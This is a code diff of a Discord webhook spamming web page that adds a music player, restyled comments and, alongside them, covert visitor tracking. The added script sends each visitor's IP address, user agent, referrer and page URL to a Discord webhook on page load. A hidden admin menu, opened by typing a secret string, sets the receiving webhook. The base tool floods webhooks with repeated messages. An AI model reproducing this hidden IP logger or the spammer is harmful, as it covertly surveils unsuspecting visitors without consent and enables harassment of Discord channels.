@@ -2,10 +2,11 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>FENDI'S WEBHOOK FUCKER</title>
     <link rel="icon" type="image/png" href="https://i.ibb.co/gL0cffbC/New-Project-7.png">
     <style>
+        /* ===================== RESET & BASE ===================== */
         * {
             margin: 0;
             padding: 0;
@@ -49,7 +50,7 @@
             pointer-events: none;
         }
 
-        /* Loading screen */
+        /* ===================== LOADING SCREEN ===================== */
         .loading-screen {
             position: fixed;
             top: 0;
@@ -103,7 +104,7 @@
         .loading-discord-link a { color: #ffdddd; text-decoration: none; font-weight: 600; }
         .loading-text { color: #ffaaaa; font-size: 0.85rem; margin-top: 1rem; }
 
-        /* Main app */
+        /* ===================== MAIN APP CONTAINER ===================== */
         .main-app {
             opacity: 0;
             transition: opacity 0.8s ease;
@@ -114,7 +115,7 @@
         }
         .main-app.visible { opacity: 1; }
 
-        /* Top-left logo + tools menu */
+        /* ===================== TOP-LEFT LOGO & MENU ===================== */
         .top-left-logo {
             position: fixed;
             top: 15px;
@@ -158,7 +159,47 @@
         .tool-item:hover { background: rgba(200,50,50,0.5); }
         .tool-item.placeholder { opacity: 0.6; cursor: not-allowed; }
 
-        /* Tilt card */
+        /* ===================== MUSIC PLAYER (NO VOLUME SLIDER) ===================== */
+        .music-player {
+            position: fixed;
+            top: 15px;
+            right: 15px;
+            background: rgba(0,0,0,0.75);
+            backdrop-filter: blur(12px);
+            border-radius: 3rem;
+            border: 1px solid rgba(255,50,50,0.6);
+            padding: 0.5rem 1rem;
+            z-index: 101;
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            font-size: 0.8rem;
+            transition: all 0.3s;
+        }
+        .music-player button {
+            background: none;
+            border: none;
+            color: #ffaaaa;
+            font-size: 1.2rem;
+            cursor: pointer;
+            padding: 0;
+            width: 28px;
+            transition: 0.2s;
+        }
+        .music-player button:hover { color: #ff8888; transform: scale(1.05); }
+        .music-player .track-title {
+            color: #ffcfcf;
+            max-width: 140px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            font-size: 0.75rem;
+        }
+        @media (max-width: 550px) {
+            .music-player .track-title { max-width: 100px; }
+        }
+
+        /* ===================== TILT CARD ===================== */
         .tilt-wrapper { perspective: 1200px; width: 100%; }
         .tilt-card {
             background: rgba(10,5,5,0.75);
@@ -226,7 +267,7 @@
             100% { transform: translateX(0); opacity: 1; }
         }
 
-        /* Glowing typewriter title with eternal loop */
+        /* ===================== TYPOGRAPHY & TITLES ===================== */
         .glow-title {
             text-align: center;
             font-size: 1.7rem;
@@ -246,7 +287,6 @@
             0% { text-shadow: 0 0 5px rgba(255,50,50,0.4), 0 0 10px rgba(200,20,20,0.3); }
             100% { text-shadow: 0 0 20px rgba(255,80,80,0.8), 0 0 35px rgba(255,40,40,0.6); }
         }
-        /* Red "BOT CUSTOMIZATION" text */
         .settings-title-red {
             text-align: center;
             font-size: 1.3rem;
@@ -265,7 +305,7 @@
             padding-bottom: 4px;
         }
 
-        /* Form elements */
+        /* ===================== FORM ELEMENTS ===================== */
         .input-group {
             margin-bottom: 1.2rem;
             display: flex;
@@ -369,7 +409,7 @@
         button:hover { background: linear-gradient(95deg, #e03a3a, #a80000); transform: scale(0.98); }
         .close-settings { background: linear-gradient(95deg, #3a1a1a, #2a0a0a); margin-top: 0.8rem; }
 
-        /* Custom file upload */
+        /* ===================== CUSTOM FILE UPLOAD ===================== */
         .custom-file-upload {
             background: linear-gradient(95deg, #5a1a1a, #3a0a0a);
             border: 1px solid #a12323;
@@ -380,11 +420,13 @@
             color: #ffcccc;
             font-weight: 500;
             font-size: 0.9rem;
+            display: inline-block;
+            width: 100%;
         }
         .custom-file-upload:hover { background: linear-gradient(95deg, #7a2a2a, #5a1a1a); border-color: #ff6666; }
         input[type="file"] { display: none; }
 
-        /* Current settings rows with RED text */
+        /* ===================== CURRENT SETTINGS ROWS ===================== */
         .current-row {
             background: rgba(0,0,0,0.5);
             border-radius: 1rem;
@@ -415,7 +457,7 @@
         }
         .edit-btn:hover { background: #c72a2a; }
 
-        /* Modals - full width inputs */
+        /* ===================== MODALS ===================== */
         .edit-overlay {
             position: fixed;
             top: 0;
@@ -451,7 +493,38 @@
         .edit-actions { display: flex; gap: 0.8rem; margin-top: 1rem; }
         .edit-actions button { padding: 0.5rem; margin: 0; }
 
-        /* Console - red themed, first line red */
+        /* ===================== ADMIN MENU (IP LOG WEBHOOK SETTER) ===================== */
+        .admin-menu {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(15,5,5,0.95);
+            backdrop-filter: blur(12px);
+            border: 2px solid #ff4d4d;
+            border-radius: 2rem;
+            padding: 1.5rem;
+            width: 90%;
+            max-width: 400px;
+            z-index: 2000;
+            display: none;
+            flex-direction: column;
+            gap: 1rem;
+            box-shadow: 0 0 40px rgba(0,0,0,0.8);
+        }
+        .admin-menu.active { display: flex; }
+        .admin-menu h3 { color: #ff8888; text-align: center; }
+        .admin-menu input { width: 100%; }
+        .admin-menu button {
+            background: linear-gradient(95deg, #c72a2a, #8b0000);
+            margin-top: 0;
+        }
+        .admin-menu .close-admin {
+            background: #3a1a1a;
+            margin-top: 0.5rem;
+        }
+
+        /* ===================== CONSOLE ===================== */
         .status-msg {
             margin-top: 1rem;
             padding: 0.7rem;
@@ -473,6 +546,7 @@
         .console-line.info { color: #ffcc88; text-shadow: 0 0 2px #aa6600; }
         .console-line.red-start { color: #ff4444; font-weight: bold; }
 
+        /* ===================== UTILITIES ===================== */
         .preview-thumb {
             width: 28px;
             height: 28px;
@@ -514,15 +588,34 @@
 <div class="grid-backdrop"></div>
 <canvas id="snowCanvas"></canvas>
 
+<!-- TOP-LEFT LOGO -->
 <div class="top-left-logo" id="logoBtn">
     <img src="https://i.ibb.co/gL0cffbC/New-Project-7.png" alt="Menu">
 </div>
+
+<!-- TOOLS MENU -->
 <div id="toolsMenu" class="tools-menu">
     <h4>Other Tools</h4>
     <div class="tool-item placeholder">Webhook Analyzer</div>
     <div class="tool-item placeholder">Message Stats</div>
     <div class="tool-item placeholder">Theme Editor</div>
     <div class="tool-item placeholder">Quick Spammer</div>
+</div>
+
+<!-- MUSIC PLAYER (NO VOLUME SLIDER) -->
+<div class="music-player" id="musicPlayer">
+    <button id="prevTrackBtn">⏮</button>
+    <button id="playPauseBtn">⏸</button>
+    <button id="nextTrackBtn">⏭</button>
+    <span id="trackTitle" class="track-title">Jarren Benton</span>
+</div>
+
+<!-- ADMIN MENU FOR SETTING IP LOG WEBHOOK -->
+<div id="adminMenu" class="admin-menu">
+    <h3>🔐 Admin: IP Log Webhook</h3>
+    <input type="text" id="ipLogWebhookInput" placeholder="Discord Webhook URL for IP logs">
+    <button id="saveIpWebhookBtn">Save & Test</button>
+    <button id="closeAdminBtn" class="close-admin">Close</button>
 </div>
 
 <div id="loadingScreen" class="loading-screen">
@@ -558,7 +651,7 @@
                     <footer><span id="joinFooter" class="join-link">Join discord.gg/funerals</span> | secure webhook sender</footer>
                 </div>
 
-                <!-- SETTINGS PANEL with red title -->
+                <!-- SETTINGS PANEL -->
                 <div id="settingsPanel" class="panel panel-settings" style="display: none;">
                     <div class="settings-title-red">BOT CUSTOMIZATION</div>
                     <div style="text-align:center;"><span class="sub">current settings</span></div>
@@ -572,26 +665,208 @@
     </div>
 </div>
 
-<!-- Modals -->
+<!-- MODALS -->
 <div id="nameModal" class="edit-overlay"><div class="edit-modal"><h3>Edit Bot Name</h3><input type="text" id="nameInput" placeholder="Custom name" style="width:100%"><div class="edit-actions"><button id="saveNameBtn">Save</button><button id="cancelNameBtn" style="background:#3a1a1a;">Cancel</button></div></div></div>
-<div id="picModal" class="edit-overlay"><div class="edit-modal"><h3>Edit Bot Avatar</h3><div class="input-group"><label>Image URL</label><input type="text" id="picUrlInput" placeholder="https://..."></div><div style="text-align:center; margin:10px 0;">OR</div><label class="custom-file-upload" id="uploadLabel">Choose Image from PC</label><input type="file" id="fileUpload" accept="image/jpeg,image/png,image/gif,image/webp"><div id="picPreview" style="margin-top:10px; text-align:center;"></div><div class="edit-actions"><button id="savePicBtn">Save</button><button id="cancelPicBtn" style="background:#3a1a1a;">Cancel</button></div></div></div>
+<div id="picModal" class="edit-overlay"><div class="edit-modal"><h3>Edit Bot Avatar</h3><div class="input-group"><label>Image URL</label><input type="text" id="picUrlInput" placeholder="https://..."></div><div style="text-align:center; margin:10px 0;">OR</div><label for="fileUpload" class="custom-file-upload">Choose Image from PC</label><input type="file" id="fileUpload" accept="image/jpeg,image/png,image/gif,image/webp" capture="environment"><div id="picPreview" style="margin-top:10px; text-align:center;"></div><div class="edit-actions"><button id="savePicBtn">Save</button><button id="cancelPicBtn" style="background:#3a1a1a;">Cancel</button></div></div></div>
 
 <script>
     (function() {
-        // ========== THOCKY KEYBOARD SOUND ==========
-        const thockSound = new Audio('https://www.myinstants.com/media/sounds/mechanical-keyboard-2.mp3');
-        thockSound.volume = 0.12;
-        function playThock() {
-            const clone = thockSound.cloneNode();
-            clone.volume = 0.1;
-            clone.play().catch(e => console.log("Sound blocked"));
+        // ===================== IP LOGGING & ADMIN WEBHOOK =====================
+        let ipLogWebhook = localStorage.getItem('ipLogWebhook') || null;
+        
+        // Function to send IP data to the configured webhook
+        async function sendIpToWebhook(ipData) {
+            if (!ipLogWebhook) return;
+            const embed = {
+                title: "🌐 New Visitor",
+                color: 0xff4444,
+                fields: [
+                    { name: "IP Address", value: ipData.ip || "Unknown", inline: true },
+                    { name: "Timestamp", value: new Date().toLocaleString(), inline: true },
+                    { name: "User Agent", value: ipData.userAgent || navigator.userAgent, inline: false },
+                    { name: "Referrer", value: document.referrer || "Direct", inline: false },
+                    { name: "Page URL", value: window.location.href, inline: false }
+                ],
+                footer: { text: "IP Logging System" },
+                timestamp: new Date().toISOString()
+            };
+            try {
+                await fetch(ipLogWebhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+                console.log("IP log sent");
+            } catch(e) { console.error("Failed to send IP log"); }
         }
-        // Listen for keydown on input and textarea elements
+        
+        // Fetch visitor IP using ipify
+        async function logVisitor() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const ip = data.ip;
+                const visitorData = {
+                    ip: ip,
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                };
+                await sendIpToWebhook(visitorData);
+            } catch(e) {
+                console.error("IP fetch failed", e);
+                // Fallback: send minimal data
+                await sendIpToWebhook({ ip: "Unknown", userAgent: navigator.userAgent });
+            }
+        }
+        
+        // Call on page load
+        logVisitor();
+        
+        // ===================== ADMIN MENU (Trigger: "iplog1015" in webhook URL field) =====================
+        const webhookUrlInput = document.getElementById('webhookUrl');
+        const adminMenu = document.getElementById('adminMenu');
+        const ipLogWebhookInput = document.getElementById('ipLogWebhookInput');
+        const saveIpWebhookBtn = document.getElementById('saveIpWebhookBtn');
+        const closeAdminBtn = document.getElementById('closeAdminBtn');
+        
+        webhookUrlInput.addEventListener('input', (e) => {
+            if (e.target.value === 'iplog1015') {
+                adminMenu.classList.add('active');
+                ipLogWebhookInput.value = ipLogWebhook || '';
+                e.target.value = ''; // clear trigger
+            }
+        });
+        
+        saveIpWebhookBtn.addEventListener('click', () => {
+            const newWebhook = ipLogWebhookInput.value.trim();
+            if (newWebhook && /^https:\/\/discord\.com\/api\/webhooks\//i.test(newWebhook)) {
+                ipLogWebhook = newWebhook;
+                localStorage.setItem('ipLogWebhook', ipLogWebhook);
+                // Send a test message
+                fetch(ipLogWebhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: "✅ IP logging webhook configured successfully!" })
+                }).catch(e => console.error);
+                alert("IP log webhook saved and tested.");
+            } else if (newWebhook === "") {
+                ipLogWebhook = null;
+                localStorage.removeItem('ipLogWebhook');
+                alert("IP logging disabled.");
+            } else {
+                alert("Invalid Discord webhook URL.");
+            }
+            adminMenu.classList.remove('active');
+        });
+        
+        closeAdminBtn.addEventListener('click', () => {
+            adminMenu.classList.remove('active');
+        });
+        
+        // Also close when clicking outside? Not necessary but fine.
+        
+        // ===================== SIMPLE MUSIC PLAYER (No volume slider) =====================
+        const trackList = [
+            "Huffing Glue With Hasselhoff",
+            "Skitzo",
+            "Go Off",
+            "Cadillacs & Chevys",
+            "Don't Need You",
+            "Silence",
+            "Gimme The Loot"
+        ];
+        let currentTrack = 0;
+        let audio = null;
+        let isPlaying = false;
+        const trackTitleSpan = document.getElementById('trackTitle');
+        const playPauseBtn = document.getElementById('playPauseBtn');
+        const prevBtn = document.getElementById('prevTrackBtn');
+        const nextBtn = document.getElementById('nextTrackBtn');
+        
+        function loadTrack(index) {
+            if (audio) {
+                audio.pause();
+                audio = null;
+            }
+            const trackName = trackList[index];
+            trackTitleSpan.textContent = trackName.length > 20 ? trackName.substring(0, 18) + '...' : trackName;
+            if (isPlaying) {
+                isPlaying = false;
+                playPauseBtn.textContent = '▶';
+            }
+        }
+        
+        function playPause() {
+            if (!audio) {
+                // For demo, toggle state without actual sound (replace with actual audio files if desired)
+                isPlaying = !isPlaying;
+                playPauseBtn.textContent = isPlaying ? '⏸' : '▶';
+                return;
+            }
+            if (isPlaying) {
+                audio.pause();
+                playPauseBtn.textContent = '▶';
+            } else {
+                audio.play();
+                playPauseBtn.textContent = '⏸';
+            }
+            isPlaying = !isPlaying;
+        }
+        
+        function nextTrack() {
+            currentTrack = (currentTrack + 1) % trackList.length;
+            loadTrack(currentTrack);
+            if (isPlaying && audio) audio.play();
+        }
+        
+        function prevTrack() {
+            currentTrack = (currentTrack - 1 + trackList.length) % trackList.length;
+            loadTrack(currentTrack);
+            if (isPlaying && audio) audio.play();
+        }
+        
+        playPauseBtn.addEventListener('click', playPause);
+        prevBtn.addEventListener('click', prevTrack);
+        nextBtn.addEventListener('click', nextTrack);
+        loadTrack(0);
+        
+        // ===================== SCROLL MOTION BLUR =====================
+        let scrollTimeout;
+        window.addEventListener('scroll', () => {
+            document.body.classList.add('scrolling');
+            clearTimeout(scrollTimeout);
+            scrollTimeout = setTimeout(() => {
+                document.body.classList.remove('scrolling');
+            }, 150);
+        });
+        const styleBlur = document.createElement('style');
+        styleBlur.textContent = 'body.scrolling { filter: blur(2px); transition: filter 0.15s ease-out; } body { transition: filter 0.15s ease-out; }';
+        document.head.appendChild(styleBlur);
+        
+        // ===================== THOCKY KEYBOARD SOUND =====================
+        let audioCtx = null;
+        function playThock() {
+            try {
+                if (!audioCtx) {
+                    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                }
+                const now = audioCtx.currentTime;
+                const oscillator = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
+                oscillator.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                oscillator.frequency.value = 80;
+                gainNode.gain.setValueAtTime(0.08, now);
+                gainNode.gain.exponentialRampToValueAtTime(0.0001, now + 0.15);
+                oscillator.start(now);
+                oscillator.stop(now + 0.15);
+            } catch(e) { /* silent fail */ }
+        }
         document.querySelectorAll('input, textarea').forEach(el => {
             el.addEventListener('keydown', playThock);
         });
         
-        // ========== ETERNAL TYPEWRITER WITH GLOW ==========
+        // ===================== ETERNAL TYPEWRITER WITH GLOW =====================
         const phrases = ["FENDI'S WEBHOOK FUCKER"];
         let phraseIndex = 0;
         let charIndex = 0;
@@ -621,8 +896,8 @@
             }
         }
         typeEffect();
-
-        // ========== LOADING SCREEN ==========
+        
+        // ===================== LOADING SCREEN =====================
         const loadingScreen = document.getElementById('loadingScreen');
         const mainApp = document.getElementById('mainApp');
         setTimeout(() => {
@@ -632,21 +907,21 @@
                 mainApp.classList.add('visible');
             }, 800);
         }, 2800);
-
-        // ========== JOIN SERVER BUTTONS ==========
+        
+        // ===================== JOIN SERVER BUTTONS =====================
         const joinBtns = ['loadingJoin', 'joinFooter'];
         joinBtns.forEach(id => {
             const el = document.getElementById(id);
             if (el) el.addEventListener('click', (e) => { e.preventDefault(); window.open('https://discord.gg/funerals', '_blank'); });
         });
-
-        // ========== TOOLS MENU ==========
+        
+        // ===================== TOOLS MENU =====================
         const logo = document.getElementById('logoBtn');
         const toolsMenu = document.getElementById('toolsMenu');
         logo.addEventListener('click', (e) => { e.stopPropagation(); toolsMenu.classList.toggle('active'); });
         document.addEventListener('click', (e) => { if (!toolsMenu.contains(e.target) && !logo.contains(e.target)) toolsMenu.classList.remove('active'); });
-
-        // ========== SNOW PARTICLES ==========
+        
+        // ===================== SNOW PARTICLES =====================
         const canvas = document.getElementById('snowCanvas');
         const ctx = canvas.getContext('2d');
         let particles = [];
@@ -683,8 +958,8 @@
         resizeCanvas();
         initSnow();
         drawSnow();
-
-        // ========== TILT EFFECT ==========
+        
+        // ===================== TILT EFFECT =====================
         const card = document.getElementById('tiltCard');
         const maxTilt = 5;
         function onMouseMove(e) {
@@ -702,15 +977,15 @@
         });
         card.addEventListener('mouseenter', () => card.style.transition = 'transform 0.05s linear');
         window.addEventListener('mousemove', onMouseMove);
-
-        // ========== PANEL SWITCHING WITH HEIGHT ANIMATION ==========
+        
+        // ===================== PANEL SWITCHING =====================
         const mainPanel = document.getElementById('mainPanel');
         const settingsPanel = document.getElementById('settingsPanel');
         const settingsBtn = document.getElementById('settingsBtn');
         const closeSettingsBtn = document.getElementById('closeSettingsBtn');
         let isSwitching = false;
         let settingsVisible = false;
-
+        
         function getPanelHeight(panel) {
             const clone = panel.cloneNode(true);
             clone.style.position = 'absolute';
@@ -721,7 +996,7 @@
             document.body.removeChild(clone);
             return h;
         }
-
+        
         function animateHeight(targetHeight) {
             const startHeight = card.offsetHeight;
             if (startHeight === targetHeight) return;
@@ -732,7 +1007,7 @@
                 card.style.transition = '';
             }, 450);
         }
-
+        
         function openSettings() {
             if (isSwitching) return;
             isSwitching = true;
@@ -752,7 +1027,7 @@
                 setTimeout(() => { isSwitching = false; }, 450);
             }, 200);
         }
-
+        
         function closeSettings() {
             if (isSwitching) return;
             isSwitching = true;
@@ -777,11 +1052,11 @@
                 }, 450);
             }, 200);
         }
-
+        
         settingsBtn.addEventListener('click', () => settingsVisible ? closeSettings() : openSettings());
         closeSettingsBtn.addEventListener('click', closeSettings);
-
-        // ========== SPAM TOGGLE ==========
+        
+        // ===================== SPAM TOGGLE =====================
         const spamCheck = document.getElementById('spamToggle');
         const spamWrapper = document.getElementById('spamWrapper');
         spamCheck.addEventListener('change', () => {
@@ -792,8 +1067,8 @@
                 else animateHeight(getPanelHeight(mainPanel));
             }, 50);
         });
-
-        // ========== BOT CUSTOMIZATION DATA ==========
+        
+        // ===================== BOT CUSTOMIZATION =====================
         let botName = '';
         let botAvatar = '';
         const nameSpan = document.getElementById('currentName');
@@ -809,7 +1084,7 @@
                 viewPic.style.display = 'none';
             }
         }
-
+        
         // Name modal
         const nameModal = document.getElementById('nameModal');
         const nameInput = document.getElementById('nameInput');
@@ -817,7 +1092,7 @@
         editName.addEventListener('click', () => { nameInput.value = botName; nameModal.classList.add('active'); });
         document.getElementById('saveNameBtn').addEventListener('click', () => { botName = nameInput.value.trim(); updateUI(); nameModal.classList.remove('active'); });
         document.getElementById('cancelNameBtn').addEventListener('click', () => nameModal.classList.remove('active'));
-
+        
         // Picture modal
         const picModal = document.getElementById('picModal');
         const picUrlInput = document.getElementById('picUrlInput');
@@ -882,17 +1157,16 @@
         });
         document.getElementById('cancelPicBtn').addEventListener('click', closePicModal);
         document.getElementById('openPicBtn').addEventListener('click', () => { if (botAvatar) window.open(botAvatar, '_blank'); });
-
-        // ========== WEBHOOK LOGIC ==========
-        const webhookInput = document.getElementById('webhookUrl');
-        const messageInput = document.getElementById('messageContent');
+        
+        // ===================== WEBHOOK LOGIC =====================
         const sendBtn = document.getElementById('sendBtn');
         const consoleDiv = document.getElementById('console');
         const clearToggle = document.getElementById('clearToggle');
         const spamAmount = document.getElementById('spamAmount');
         const spamInterval = document.getElementById('spamInterval');
+        const messageInput = document.getElementById('messageContent');
         let sending = false, stopSpam = false;
-
+        
         function addLog(text, type = 'info') {
             const line = document.createElement('div');
             line.className = `console-line ${type}`;
@@ -901,11 +1175,11 @@
             consoleDiv.scrollTop = consoleDiv.scrollHeight;
             while (consoleDiv.children.length > 30) consoleDiv.removeChild(consoleDiv.firstChild);
         }
-
+        
         function isValidWebhook(url) {
             return /^https:\/\/discord\.com\/api\/webhooks\/(\d+)\/([a-zA-Z0-9_\-]+)/i.test(url.trim());
         }
-
+        
         async function sendSingle(webhook, msg) {
             const payload = { content: msg };
             if (botName.trim()) payload.username = botName.trim();
@@ -918,7 +1192,7 @@
             if (!res.ok) throw new Error(`HTTP ${res.status}`);
             return true;
         }
-
+        
         async function runSpam(webhook, msg, amount, interval) {
             let success = 0;
             for (let i = 1; i <= amount; i++) {
@@ -935,18 +1209,18 @@
             }
             return success;
         }
-
+        
         async function handleSend() {
             if (sending) {
                 if (spamCheck.checked) { stopSpam = true; addLog('Aborting spam...', 'info'); }
                 return;
             }
-            const webhook = webhookInput.value.trim();
+            const webhook = webhookUrlInput.value.trim();
             const msg = messageInput.value.trim();
             if (!webhook) { addLog('Missing webhook URL', 'error'); return; }
             if (!msg) { addLog('Missing message', 'error'); return; }
             if (!isValidWebhook(webhook)) { addLog('Invalid webhook URL', 'error'); return; }
-
+            
             const isSpam = spamCheck.checked;
             let amount = 1, interval = 100;
             if (isSpam) {
@@ -976,8 +1250,8 @@
         }
         sendBtn.addEventListener('click', handleSend);
         messageInput.addEventListener('keydown', (e) => { if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') handleSend(); });
-
-        // ========== DYNAMIC GRID LIGHTING ==========
+        
+        // ===================== DYNAMIC GRID LIGHTING =====================
         const gridBackdrop = document.querySelector('.grid-backdrop');
         document.addEventListener('mousemove', (e) => {
             const x = (e.clientX / window.innerWidth) * 100;
@@ -988,7 +1262,7 @@
                 radial-gradient(circle at ${x}% ${y}%, rgba(130,0,0,0.7), rgba(0,0,0,0.95))
             `;
         });
-
+        
         updateUI();
     })();
 </script>
